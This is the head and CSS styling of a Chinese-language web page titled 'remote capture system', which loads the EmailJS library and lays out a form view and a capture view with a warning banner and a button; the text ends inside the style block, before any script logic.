<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>远程拍摄系统</title>
    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <style>
        /* ========== 基础重置 ========== */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        html, body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            width: 100%;
            height: 100%;
            overflow-x: hidden;
        }

        /* ========== 主界面 ========== */
        #mainBox {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100%;
            padding: 20px;
        }
        .main-card {
            background: white;
            border-radius: 16px;
            padding: 24px 20px;
            max-width: 520px;
            margin: 0 auto;
        }
        .main-card h1 {
            text-align: center;
            color: #333;
            margin-bottom: 20px;
            font-size: 20px;
        }
        .form-group { margin-bottom: 14px; }
        .form-group label {
            display: block;
            margin-bottom: 5px;
            color: #555;
            font-size: 13px;
            font-weight: 500;
        }
        .form-group input,
        .form-group select,
        .form-group textarea {
            width: 100%;
            padding: 10px 12px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 14px;
        }
        .btn {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 8px;
            font-size: 15px;
            cursor: pointer;
            margin-top: 10px;
            font-weight: 600;
        }
        .btn-primary {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        .btn-success { background: #28a745; color: white; }
        .section-title {
            font-size: 13px;
            font-weight: 600;
            color: #667eea;
            margin: 16px 0 8px 0;
            border-bottom: 1px solid #eee;
            padding-bottom: 4px;
        }
        .link-box {
            margin-top: 14px;
            padding: 12px;
            background: #f8f9fa;
            border-radius: 8px;
            border: 1px dashed #ccc;
        }
        .link-box a {
            color: #667eea;
            font-size: 12px;
            word-break: break-all;
            text-decoration: none;
        }
        .alias-box {
            margin-top: 10px;
            padding: 10px;
            background: #e8f4fd;
            border-radius: 6px;
            border: 1px solid #bee5eb;
            display: none;
        }
        .toast {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(0,0,0,0.85);
            color: white;
            padding: 14px 24px;
            border-radius: 8px;
            font-size: 14px;
            display: none;
            z-index: 9999;
        }

        /* ========== 拍摄界面 - 极简可见设计 ========== */
        #capturePage {
            display: none;
            background-color: #2d2d44;
            width: 100%;
            min-height: 100%;
            padding: 50px 20px;
        }
        #capturePage * {
            color: white;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        .cap-bg {
            text-align: center;
            margin-bottom: 30px;
        }
        .cap-bg img,
        .cap-bg video {
            max-width: 100%;
            border-radius: 12px;
            max-height: 200px;
        }
        .cap-warning {
            background: #ffcc00;
            color: #333 !important;
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 30px;
            font-size: 14px;
            text-align: center;
        }
        .cap-title {
            font-size: 24px;
            font-weight: bold;
            text-align: center;
            margin-bottom: 15px;
            color: white !important;
        }
        .cap-desc {
            font-size: 16px;
            text-align: center;
            margin-bottom: 40px;
            line-height: 1.5;
            color: #cccccc !important;
        }
        .cap-btn {
            display: block;
            width: 80%;
            max-width: 300px;
            margin: 0 auto;
            padding: 16px;
            background: #667eea;
            color: white !important;
            border: none;
            border-radius: 30px;
            font-size: 18px;
            text-align: center;
            cursor: pointer;
        }
